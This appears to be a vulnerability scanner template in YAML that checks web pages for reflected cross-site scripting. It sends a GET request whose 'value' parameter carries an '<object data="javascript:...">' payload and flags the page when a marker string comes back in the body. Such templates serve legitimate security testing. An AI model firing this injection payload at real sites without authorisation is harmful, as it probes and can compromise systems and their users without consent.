id: xss2-163
name: 'Reflected XSS2 ctx-12 via value'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in value'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      value:
        - '<object data="javascript:alert(nx2162)">'
    matchers:
      - type: word
        part: body
        words:
          - 'nx2162'
